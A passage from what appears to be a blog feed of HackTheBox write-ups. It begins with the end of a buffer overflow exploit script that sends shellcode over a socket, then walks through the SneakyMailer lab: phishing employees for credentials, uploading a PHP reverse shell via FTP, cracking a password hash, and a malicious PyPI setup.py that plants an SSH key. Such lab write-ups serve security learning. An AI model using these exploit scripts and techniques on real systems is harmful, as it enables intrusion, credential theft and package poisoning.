payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xae\x0f\x0c\xf5\x1e\x61\x5e\xdb\x6f\xb5\xb0\x16</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa4\x95\xf5\x68\xf4\xe0\x05</span><span style="color:#e6db74">&#34;</span>

overrun <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">1500</span> <span style="color:#960050;background-color:#1e0010">—</span> len(padding1 <span style="color:#f92672">+</span> NOPS <span style="color:#f92672">+</span> EIP <span style="color:#f92672">+</span> payload))
buf <span style="color:#f92672">=</span> padding1 <span style="color:#f92672">+</span> EIP <span style="color:#f92672">+</span> NOPS <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> overrun

<span style="color:#66d9ef">try</span>:
 s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
 s<span style="color:#f92672">.</span>connect((target,<span style="color:#ae81ff">8888</span>))
 s<span style="color:#f92672">.</span>send(buf)
<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
 <span style="color:#66d9ef">print</span>(sys<span style="color:#f92672">.</span>exc_value)
</code></pre></div><p>The exploit is ready, and now I’ll setup a listener on the same port with the one I’ve assigned to the payload and run the exploit afterwards.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «buff» «10.10.14.18»
$ python2 bofexploit.py
</code></pre></div><p>On my listener:</p>
<p><img src="imgs/image-20210502164625103.png" alt="image-20210502164625103" style="zoom:67%;" /></p>
<p>Now I can grab the root flag or dump the hashes.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html">https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html</a></li>
<li><a href="https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/">https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - SneakyMailer</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/</link>
      <pubDate>Wed, 28 Apr 2021 21:28:30 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/</guid>
      <description>SneakyMailer is a medium difficulty Linux machine from Hack The Box. It starts by obtaining credentials through phishing attack. The credentials allows me to access one of the users&#39; mailboxes and obtain an FTP account. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run pip3 with sudo privileges, and this can be leveraged to obtain root access.</description>
      <content:encoded><![CDATA[<p>SneakyMailer is a medium difficulty Linux machine from Hack The Box. It starts by obtaining credentials through phishing attack. The credentials allows me to access one of the users' mailboxes and obtain an FTP account. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run <code>pip3</code> with sudo privileges, and this can be leveraged to obtain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Phishing</li>
<li>PyPI Package Exploitation</li>
<li>Exploiting sudo privileges on pip3</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ mkdir nmap; nmap -sC -sV -oN nmap/inital-sneaky 10.10.10.197 -v

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey:
|   <span style="color:#ae81ff">2048</span> 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING,
80/tcp   open  http     nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
143/tcp  open  imap     Courier Imapd <span style="color:#f92672">(</span>released 2018<span style="color:#f92672">)</span>
|_imap-capabilities: ENABLE STARTTLS UTF8<span style="color:#f92672">=</span>ACCEPTA0001 CHILDREN ACL ACL2<span style="color:#f92672">=</span>UNION THREAD<span style="color:#f92672">=</span>ORDEREDSUBJECT THREAD<span style="color:#f92672">=</span>REFERENCES UIDPLUS OK SORT QUOTA IDLE completed CAPABILITY IMAP4rev1 NAMESPACE
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost/organizationName<span style="color:#f92672">=</span>Courier Mail Server/stateOrProvinceName<span style="color:#f92672">=</span>NY/countryName<span style="color:#f92672">=</span>US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
993/tcp  open  ssl/imap Courier Imapd <span style="color:#f92672">(</span>released 2018<span style="color:#f92672">)</span>
|_imap-capabilities: ENABLE AUTH<span style="color:#f92672">=</span>PLAIN CHILDREN ACL ACL2<span style="color:#f92672">=</span>UNION THREAD<span style="color:#f92672">=</span>ORDEREDSUBJECT THREAD<span style="color:#f92672">=</span>REFERENCES UIDPLUS OK SORT QUOTA completed IDLE IMAP4rev1 CAPABILITY UTF8<span style="color:#f92672">=</span>ACCEPTA0001 NAMESPACE
| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>localhost/organizationName<span style="color:#f92672">=</span>Courier Mail Server/stateOrProvinceName<span style="color:#f92672">=</span>NY/countryName<span style="color:#f92672">=</span>US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>With an initial scan, <code>nmap</code> discovered seven ports open and also identified the services behind them.</p>
<p>I’ll summarize the result:</p>
<ul>
<li>There is an FTP service on port 21, but <code>nmap</code> shows no sign that anonymous login is allowed.</li>
<li>An SSH service on port 22</li>
<li>Three email protocols, SMTP on port 25, IMAP on port 143 and secure IMAP on port 993</li>
<li>And a web server hosting two sites on port 80 and 8080. <code>nmap</code> identifies the hostname as <code>sneakycorp.htb</code>.</li>
</ul>
<p>I’ll add <code>sneakycorp.htb</code> to my <code>/etc/hosts</code> file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ echo <span style="color:#e6db74">&#39;10.10.10.197 sneakycorp.htb&#39;</span> &gt;&gt; /etc/hosts 
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting <code>sneakycorp.htb</code> on port 80 displays a project dashboard for a company called SneakyCorp. One project is marked as &ldquo;Complete!&rdquo; while the other one seems still in progress for about 80%.</p>
<p><img src="imgs/7f7b01dbdf744b97b9ccc3c260288ee1.png" alt="7f7b01dbdf744b97b9ccc3c260288ee1" style="zoom:67%;" /></p>
<p>Clicking on the &ldquo;Team&rdquo; menu points to<code>/team.php</code>. This page shows a table contains the employees' data of SneakyCorp.</p>
<p><img src="imgs/1a6090141fa446bd88cf25781913b8d5.png" alt="1a6090141fa446bd88cf25781913b8d5" style="zoom:67%;" /></p>
<p>I saved the whole table data and stored it in a file called <code>team</code>.</p>
<p><img src="imgs/c3c89ffbc8854cf1abf6ebece09b0197.png" alt="c3c89ffbc8854cf1abf6ebece09b0197" style="zoom:67%;" /></p>
<p>I can grab the emails using the <code>grep</code> and <code>tr</code> command as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ cat team | egrep -o <span style="color:#e6db74">&#34;[^[:space:]]+@[^[:space:]]+&#34;</span> | tr -d <span style="color:#e6db74">&#34;&lt;&gt;&#34;</span> | tee emails.list
</code></pre></div><p><img src="imgs/612596863de94710b3a4ed80fd375133.png" alt="612596863de94710b3a4ed80fd375133" style="zoom:67%;" /></p>
<p>I ran <code>gobuster</code> but it didn&rsquo;t show any interesting results.</p>
<h3 id="tcp-8080--website">TCP 8080 —  Website</h3>
<p>It returns the default Nginx page.</p>
<h3 id="tcp-25--smtp-mail">TCP 25  —  SMTP (Mail)</h3>
<p>I tried to send an email, and it got queued.</p>
<p><img src="imgs/4b5e0238399640bd9b40a2810102ce39.png" alt="4b5e0238399640bd9b40a2810102ce39" style="zoom:67%;" /></p>
<p>Given a list of email addresses, the box title, as well as the illustration, I can guess it has something to do with email phishing.</p>
<h4 id="email-phishing">Email Phishing</h4>
<p>I&rsquo;ll setup <code>netcat</code> listener on port 80, and then I&rsquo;ll use a tool called <code>swaks</code> to send an email containing my IP address to all the email addresses I&rsquo;ve got.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ swaks --server <span style="color:#e6db74">&#39;10.10.10.197&#39;</span> --to <span style="color:#e6db74">`</span>cat emails.list | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#e6db74">`</span> --from admin@sneakymailer.htb --body <span style="color:#e6db74">&#34;http://10.10.14.42/&#34;</span>
</code></pre></div><p>And there is an HTTP POST request coming to my listener.</p>
<p><img src="imgs/330df9a36349481fb8d7cef7660c535e.png" alt="330df9a36349481fb8d7cef7660c535e" style="zoom:67%;" /></p>
<p>The request body contains this data.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
</span></code></pre></div><p>It can be decoded using an online url decoder.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd@sneakymailer.htb&amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht&amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
</span></code></pre></div><p>The parameter <code>password</code> and <code>rpassword</code> seem juicy where the <strong>r</strong> might refer to reset or retype the password. Unfortunately, the password doesn&rsquo;t work on SSH and FTP.</p>
<h3 id="tcp-143---imap">TCP 143 - IMAP</h3>
<p>With the obtained credentials, I can try to use it on IMAP, but since Kali doesn’t have any builtin mail apps, I&rsquo;ll need an email client, and I end up with <a href="https://sylpheed.sraoss.jp/en/">sylpheed</a>. You can install it with <code>sudo apt-get install sylpheed</code>.</p>
<p>But before moving on, I&rsquo;ll add <code>sneakymailer.htb</code> to my<code>/etc/hosts</code> file to avoid problems with dns/name resolution.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ echo <span style="color:#e6db74">&#39;10.10.10.197 sneakymailer.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><h4 id="initial-setup">Initial Setup</h4>
<p>As this is my first install, I&rsquo;ll have to determine the location of the mailbox (storage) for receiving email from the mail server. I decided to put it on<code>/root/sneaky/loot/Mail</code>.</p>
<p><img src="imgs/336c2c9d596e4a86ba1ce454e912b2d9.png" alt="336c2c9d596e4a86ba1ce454e912b2d9" style="zoom:67%;" /></p>
<p>Next I&rsquo;ll have to determine the account type. Because the box only has IMAP listening and we&rsquo;re not going outside VPN connection, then I should choose IMAP4.</p>
<p><img src="imgs/aaa3354fe43a4564b1b13aec5c14a83c.png" alt="aaa3354fe43a4564b1b13aec5c14a83c" style="zoom:67%;" /></p>
<p>In the following section, I&rsquo;ll use the display name Paul and the email address <code>paulbyrd@sneakymailer.htb</code> that I obtained through phishing.</p>
<p><img src="imgs/3361aa3232224c8890c857f9e913becc.png" alt="3361aa3232224c8890c857f9e913becc" style="zoom:67%;" /></p>
<p>I lost some screenshots after the step above, but here is the final configuration.</p>
<p><img src="imgs/8ded1188afee41fd852d14e4943fc9b4.png" alt="8ded1188afee41fd852d14e4943fc9b4" style="zoom:67%;" /></p>
<p>Lastly, enter <code>paulbyrd</code>&rsquo;s password, <code>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code>, if the app asks for it after applying the configuration. Now wait until it fetches all the emails from the server.</p>
<h4 id="retrieving-the-emails">Retrieving the emails</h4>
<p>In Paul&rsquo;s mailbox, I found two emails inside the &ldquo;Sent Items&rdquo; folder.</p>
<p>The first email was sent with the subject of &ldquo;Password Reset&rdquo;. In this email, Paul asks the administrator to change the developer account password. I&rsquo;ll grab the credentials of the developer account.</p>
<p><img src="imgs/540344afea7f42debd7cdc36f3fadd32.png" alt="540344afea7f42debd7cdc36f3fadd32" style="zoom:67%;" /></p>
<p>The second email was sent with the subject &ldquo;Module testing&rdquo;, but right now I&rsquo;m not sure what it is about.</p>
<p><img src="imgs/f11b8bd4b2934eb892f681d23a369cdd-1619628769041.png" alt="f11b8bd4b2934eb892f681d23a369cdd" style="zoom:67%;" /></p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="ftp-access">FTP Access</h4>
<p>The developer account can be used to access the FTP server. There is only one directory called<code>/dev</code> in the FTP root directory.</p>
<p><img src="imgs/f761f7b9b264477ebae8d690c347cbef.png" alt="f761f7b9b264477ebae8d690c347cbef" style="zoom:67%;" /></p>
<p>I access the FTP server via browser. The files inside this FTP look the same files as the one hosted on <code>sneakycorp.htb</code>, except it has the additional word &ldquo;dev&rdquo; in the title.</p>
<p><img src="imgs/cea046ccdffc4e0f83620407c53726d5.png" alt="cea046ccdffc4e0f83620407c53726d5" style="zoom: 67%;" /></p>
<h4 id="reverse-shell-via-ftp-upload">Reverse Shell via FTP Upload</h4>
<p>It turns out that the developer account has write permission on the <code>/dev</code> directory, so I can drop a PHP reverse shell payload there.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">211-FTP server status:
     Connected to ::ffff:10.10.14.20
     Logged in as developer
     TYPE: ASCII
     No session bandwidth limit
     Session timeout in seconds is <span style="color:#ae81ff">300</span>
     Control connection is plain text
     Data connections will be plain text
     At session startup, client count was <span style="color:#ae81ff">1</span>
     vsFTPd 3.0.3 - secure, fast, stable
ftp&gt; cd /dev
<span style="color:#ae81ff">250</span> Directory successfully changed.
ftp&gt; put /shares/reversef.php iamf.php
local: /shares/reversef.php remote: iamf.php
<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
<span style="color:#ae81ff">150</span> Ok to send data.
<span style="color:#ae81ff">226</span> Transfer complete.
<span style="color:#ae81ff">72</span> bytes sent in 0.00 secs <span style="color:#f92672">(</span>2.8610 MB/s<span style="color:#f92672">)</span>
</code></pre></div><p>At first I thought it was on <code>http://sneakycorp.htb/iamf.php</code>, the uploaded shell was available on <code>http://dev.sneakycorp.htb/iamf.php</code>, so I&rsquo;ll have to add <code>dev.sneakycorp.htb</code> to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ echo <span style="color:#e6db74">&#39;10.10.10.194&#39;</span> &gt;&gt; dev.sneakycorp.htb
</code></pre></div><p>Now I can trigger my web shell with curl.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sneakymailer» «10.10.14.42» 
$ curl -s http://dev.sneakycorp.htb/iamf.php
</code></pre></div><p>The listener has an interactive shell now.</p>
<p><img src="imgs/43276abaf55b4760822901631d8c21de.png" alt="43276abaf55b4760822901631d8c21de" style="zoom:67%;" /></p>
<p>After gaining access to the box, I can re-enumerate and search for files containing sensitive data.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-low">Shell as low</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>/var/www</code>, I found another subdomain. The new is <code>pypi.sneakycorp.htb</code>, I&rsquo;ll add it to my <code>/etc/hosts</code> file.</p>
<p><img src="imgs/image-20210429003013735.png" alt="image-20210429003013735" style="zoom: 67%;" /></p>
<p>I discovered <code>.htpasswd</code> file inside <code>pypi.sneakycorp.htb</code>, which contains PyPI credentials.</p>
<p><img src="imgs/image-20210429003321320.png" alt="image-20210429003321320" style="zoom:67%;" /></p>
<p>I&rsquo;ll save <code>pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</code> to my note and send it to my Windows for cracking. In <code>/home</code> there is no user called <code>pypi</code>, so it might be used for something else.</p>
<h4 id="cracking-password">Cracking Password</h4>
<p>The password can be cracked easily with John the Ripper.</p>
<p><img src="imgs/image-20210429003613068.png" alt="image-20210429003613068" style="zoom:67%;" /></p>
<p>The password is <code>soufianeelhaoui</code></p>
<h4 id="malicious-pypi-package">Malicious PyPI package</h4>
<p>Looking into the web configuration file, <code>pypi.sneakycorp.htb</code> is accessible on <code>localhost:5000</code>.</p>
<p><img src="imgs/image-20210429005849918.png" alt="image-20210429005849918" style="zoom: 67%;" /></p>
<p>It is also accessible from remote on port 8080 if I specify the hostname, <code>pypi.sneakycorp.htb</code>.</p>
<p><img src="imgs/image-20210429005829551.png" alt="image-20210429005829551" style="zoom:67%;" /></p>
<p>Remember about the second email Paul sent to user law?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Hello low

Your current task is to install, test and then erase every python module you 
find in our PyPI service, let me know if you have any inconvenience.
</code></pre></div><p>Now the idea is that I can create my own PyPI package, of course a malicious one, upload it (via local or remote), and then let user <code>low</code> install the package (configured by the box&rsquo;s author automatically).</p>
<p>To create a package, I&rsquo;ll use the official site tutorial as my reference:</p>
<ul>
<li><a href="https://packaging.python.org/tutorials/packaging-projects/">https://packaging.python.org/tutorials/packaging-projects/</a></li>
<li>And you might want to read this too, <a href="https://packaging.python.org/specifications/pypirc/">https://packaging.python.org/specifications/pypirc/</a></li>
</ul>
<p>First, I&rsquo;ll get the <code>setup.py</code> template which looks like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> setuptools

<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;README.md&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#66d9ef">as</span> fh:
    long_description <span style="color:#f92672">=</span> fh<span style="color:#f92672">.</span>read()

setuptools<span style="color:#f92672">.</span>setup(
    name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;example-pkg-YOUR-USERNAME-HERE&#34;</span>, <span style="color:#75715e"># Replace with your own username</span>
    version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.1&#34;</span>,
    author<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Example Author&#34;</span>,
    author_email<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author@example.com&#34;</span>,
    description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A small example package&#34;</span>,
    long_description<span style="color:#f92672">=</span>long_description,
    long_description_content_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/markdown&#34;</span>,
    url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://github.com/pypa/sampleproject&#34;</span>,
    project_urls<span style="color:#f92672">=</span>{
        <span style="color:#e6db74">&#34;Bug Tracker&#34;</span>: <span style="color:#e6db74">&#34;https://github.com/pypa/sampleproject/issues&#34;</span>,
    },
    classifiers<span style="color:#f92672">=</span>[
        <span style="color:#e6db74">&#34;Programming Language :: Python :: 3&#34;</span>,
        <span style="color:#e6db74">&#34;License :: OSI Approved :: MIT License&#34;</span>,
        <span style="color:#e6db74">&#34;Operating System :: OS Independent&#34;</span>,
    ],
    package_dir<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;&#34;</span>: <span style="color:#e6db74">&#34;src&#34;</span>},
    packages<span style="color:#f92672">=</span>setuptools<span style="color:#f92672">.</span>find_packages(where<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;src&#34;</span>),
    python_requires<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&gt;=3.6&#34;</span>,
)
</code></pre></div><p>My goal is only to insert my SSH public key to <code>low</code>&rsquo;s authorized_keys, so I&rsquo;ll need to modify the code to this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> setuptools
<span style="color:#66d9ef">try</span>:
        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;/home/low/.ssh/authorized_keys&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
                f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINtXqxDD334hQ3aaabbbssssdd&#34;</span>)
        f<span style="color:#f92672">.</span>close()
<span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
        <span style="color:#66d9ef">pass</span>
setuptools<span style="color:#f92672">.</span>setup(
        name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;low&#34;</span>,
        version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.1&#34;</span>,
        author<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Example Author&#34;</span>,
        author_email<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;author@example.com&#34;</span>,
        description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A small example package&#34;</span>,
        long_description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>,
        long_description_content_type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/markdown&#34;</span>,
     url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://github.com/pypa/sampleproject&#34;</span>,
     packages<span style="color:#f92672">=</span>setuptools<span style="color:#f92672">.</span>find_packages(),
     classifiers<span style="color:#f92672">=</span>[
        <span style="color:#e6db74">&#34;Programming Language :: Python :: 3&#34;</span>,
        <span style="color:#e6db74">&#34;License :: OSI Approved :: MIT License&#34;</span>,
        <span style="color:#e6db74">&#34;Operating System :: OS Independent&#34;</span>,
     ],
)
</code></pre></div><p>From the link above, in order to upload a package to the PyPI server, a file called <code>.pypirc</code> must be present at <code>$HOME/.pypirc</code>.</p>
<p>The file is required for authentication, so I&rsquo;ll create one and put the PyPI credentials I obtained before.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">[<span style="color:#a6e22e">distutils</span>]
<span style="color:#a6e22e">index</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">servers</span> =
 <span style="color:#a6e22e">local</span>
 
[<span style="color:#a6e22e">local</span>]
<span style="color:#a6e22e">repository</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">://</span><span style="color:#ae81ff">127.0</span>.<span style="color:#ae81ff">0.1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">5000</span>
<span style="color:#a6e22e">username</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">pypi</span>
<span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">soufianeelhaoui</span>
</code></pre></div><p>If I wanted to upload remotely, my <code>.pypirc</code> would look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">[<span style="color:#a6e22e">distutils</span>]
<span style="color:#a6e22e">index</span><span style="color:#960050;background-color:#1e0010">-</span><span style="color:#a6e22e">servers</span> =
 <span style="color:#a6e22e">remote</span>
 
[<span style="color:#a6e22e">remote</span>]
<span style="color:#a6e22e">repository</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">http</span><span style="color:#960050;background-color:#1e0010">://</span><span style="color:#a6e22e">pypi</span>.<span style="color:#a6e22e">sneakycorp</span>.<span style="color:#a6e22e">htb</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8080</span>
<span style="color:#a6e22e">username</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">pypi</span>
<span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#a6e22e">soufianeelhaoui</span>
</code></pre></div><p>I&rsquo;ll transfer <code>setup.py</code> and <code>.pypirc</code> to <code>/dev/shm</code> of SneakyMailer via Python http server.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «exploits» «10.10.14.42» 
$ python3 -m http.server <span style="color:#ae81ff">80</span>
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
10.10.10.197 - - <span style="color:#f92672">[</span>12/Jul/2020  08:24:12<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /.pypirc HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
10.10.10.197 - - <span style="color:#f92672">[</span>12/Jul/2020  08:24:29<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /setup.py HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
</code></pre></div><p>On SneakyMailer:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/.pypirc &gt; .pypirc
www-data@sneakymailer:/dev/shm$ 
www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/setup.py &gt; setup.py
</code></pre></div><p>Now at <code>/dev/shm</code>, the folder structure looks like this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">.
├── .pypirc
├── iamf.php
└── setup.py
</code></pre></div><p>The last part is set <code>$HOME</code> to <code>/dev/shm</code>, because <code>.pypirc</code> should be placed at <code>$HOME/.pypirc</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@sneakymailer:/dev/shm$ export $HOME<span style="color:#f92672">=</span>/dev/shm
www-data@sneakymailer:~$
</code></pre></div><p>After all is set, I can start uploading the malicious package I made to the PyPI server locally using the command below.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@sneakymailer:~$ python3 setup.py sdist upload -r local
running sdist
running egg_info
